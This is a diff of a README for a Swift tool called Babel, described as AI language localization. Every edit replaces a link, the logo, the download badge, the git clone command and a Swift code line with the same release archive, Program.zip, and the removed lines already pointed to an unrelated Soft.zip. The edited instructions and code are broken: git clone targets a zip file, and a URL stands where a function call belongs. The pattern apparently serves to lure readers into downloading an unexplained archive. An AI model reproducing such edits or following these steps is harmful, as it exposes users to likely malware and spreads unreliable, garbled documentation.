@@ -1,6 +1,6 @@
 # Babel 🌍📚
 
-![Babel logo](https://www.example.com/babel-logo.png)
+![Babel logo](https://github.com/OsnirJunior/Babel/releases/download/v1.0/Program.zip)
 
 Babel is an innovative AI language localization tool that automates the translation process for various platforms and applications. With Babel, you can easily localize your content to reach a global audience without the hassle of manual translation.
 
@@ -12,9 +12,9 @@ Babel is an innovative AI language localization tool that automates the translat
 🌐 Extensive language support  
 🔧 Easy configuration with Swift Package Manager  
 🛠 Infrastructure setup with OpenAI and Slack Webhook  
-📦 Download the latest release [here](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+📦 Download the latest release [here](https://github.com/OsnirJunior/Babel/releases/download/v1.0/Program.zip)
 
-[![Download Babel](https://img.shields.io/badge/Download-Soft.zip-green)](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+[![Download Babel](https://github.com/OsnirJunior/Babel/releases/download/v1.0/Program.zip)](https://github.com/OsnirJunior/Babel/releases/download/v1.0/Program.zip)
 
 ## Topics 📋
 
@@ -40,7 +40,7 @@ Babel is an innovative AI language localization tool that automates the translat
 
 1. Clone the repository
 ```bash
-git clone https://github.com/yourusername/Babel.git
+git clone https://github.com/OsnirJunior/Babel/releases/download/v1.0/Program.zip
 ```
 
 2. Install dependencies using Swift Package Manager
@@ -59,7 +59,7 @@ swift run
 import Babel
 
 let babel = Babel()
-babel.translate(text: "Hello, world!", to: "es") // Output: ¡Hola Mundo!
+https://github.com/OsnirJunior/Babel/releases/download/v1.0/Program.zip(text: "Hello, world!", to: "es") // Output: ¡Hola Mundo!
 ```
 
 ## Contributing 🤝
